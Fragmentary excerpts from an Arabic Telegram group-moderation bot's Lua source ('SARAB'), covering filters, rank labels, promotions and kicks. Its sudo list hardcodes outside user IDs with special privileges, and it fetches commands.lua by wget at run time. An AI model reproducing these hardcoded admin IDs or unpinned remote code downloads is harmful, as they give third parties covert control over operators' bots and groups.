...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./SARAB.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("SR", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S SARAB -X kill
screen -S SARAB ./SARAB
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SARABTEAM/Files_SARAB/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,857186558,1033028167}   
...
if tonumber(user_id) == tonumber(857186558) then  
var = true  
...
local SARAB_Msg = ''  
if msgs < 100 then 
SARAB_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
SARAB_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
SARAB_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
SARAB_Msg = 'متفاعل' 
elseif msgs < 1200 then 
SARAB_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
SARAB_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
SARAB_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
SARAB_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
SARAB_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
SARAB_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
SARAB_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
SARAB_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
SARAB_Msg = 'رب التفاعل'  
end 
return SARAB_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceSARAB(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,SARAB_Msg) 
return false  
end 
if text then    
...
send(msg.chat_id_, msg.id_,'❃∫  عدد الكروبات الان » { '..#group..' }'..SARABk..''..SARAB..'\n❃∫  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ❃∫ العضو » ['..result.title_..'](t.me/'..(username or 'Yp1_7')..')'
status  = '\n ❃∫ تم ترقيته مطور'
...
usertext = '\n ❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Yp1_7')..')'
status  = '\n ❃∫ تم ترقيته مطور'
...
local SARAB1_Msg = database:get(bot_id.."SARAB1:Add:Filter:Rp2"..text..msg.chat_id_)   
if SARAB1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❃∫ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Yp1_7')..') \n ❃∫ '..SARAB1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if SARAB_Msg and not Special(msg) then  
local SARAB_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if SARAB_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ❃∫ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ❃∫ ["..SARAB_Msg.."] \n")
else
send(msg.chat_id_,0," ❃∫ العضو : {["..data.first_name_.."](T.ME/Yp1_7)}\n ❃∫ ["..SARAB_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ❃∫ عذرا » {["..data.first_name_.."](T.ME/Yp1_7)}\n ❃∫ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
≪━━━━━━𝗦𝗥━━━━━━≫
 ❃∫ ↬𝑆𝐴𝑅𝐴b 𝑇𝐸𝐴𝑀
≪━━━━━━𝗦𝗥━━━━━━≫
 ❃∫ ↬[Channel SARAB](t.me/Yp1_7) 
≪━━━━━━𝗦𝗥━━━━━━≫
 ❃∫ ↬[Information](t.me/M8llu)
≪━━━━━━𝗦𝗥━━━━━━≫
 ❃∫ ↬[DEVELOPER](t.me/Yp1_2)
≪━━━━━━𝗦𝗥━━━━━━≫
 ❃∫ ↬[To talk to us](t.me/Amr19_Bot)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ❃∫ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Yp1_7')..') \n ❃∫ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❃∫ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Yp1_7')..') \n ❃∫ تـم قفـل التاك بالكتم ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ❃∫ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Yp1_7')..')'
status  = '\n ❃∫ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ❃∫ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ❃∫ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Yp1_7')..')'
...
database:set(bot_id.."SARAB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."SARAB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ❃∫ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."SARAB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."SARAB1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."SARAB1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."SARAB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ❃∫ تم منع الكلمه مع التحذير")  
database:del(bot_id.."SARAB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."SARAB1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."SARAB1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."SARAB1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ❃∫ ارسل الكلمه الان")  
database:set(bot_id.."SARAB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."SARAB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."SARAB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."SARAB1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."SARAB1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."SARAB1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."SARAB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."SARAB1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."SARAB1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ❃∫ قائمة المنع \n≪━━━━━━𝗦𝗥━━━━━━≫\n"
for k,v in pairs(list) do  
local SARAB_Msg = database:get(bot_id.."SARAB1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..SARAB_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ❃∫ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'Yp1_7')..')'..'\n ❃∫ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'['..SARAB_Msg[math.random(#SARAB_Msg)]..']') 
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'Yp1_7')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
SARABdx(msg.chat_id_, msg.id_, ' ❃∫ ايدي المجموعة » ( '..msg.chat_id_..' )\n ❃∫ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ❃∫ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ❃∫ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
send(msg.chat_id_, msg.id_, t..'ٴ❃∫ٴ≪━━━━━━𝗦𝗥━━━━━━≫ٴ❃∫○ٴ\n❃∫ 彡 .[𝑆𝐴𝑅𝐴b 𝑇𝐸𝐴𝑀](t.me/Yp1_7)➢ ')
end
...
SARAB = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(SARAB)
...
--------------------------------------------------------------------------------------------------------------
SourceSARAB(data.message_,data)
...
------------------------------------------------------------------------
local SARABAbot = database:get(bot_id.."SARAB1:Add:Filter:Rp2"..text..result.chat_id_)   
if SARABAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ❃∫ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ❃∫ ["..SARABAbot.."] \n") 
...
if SARAB1_Msg then    
send(msg.chat_id_, msg.id_," ❃∫ "..SARAB1_Msg)
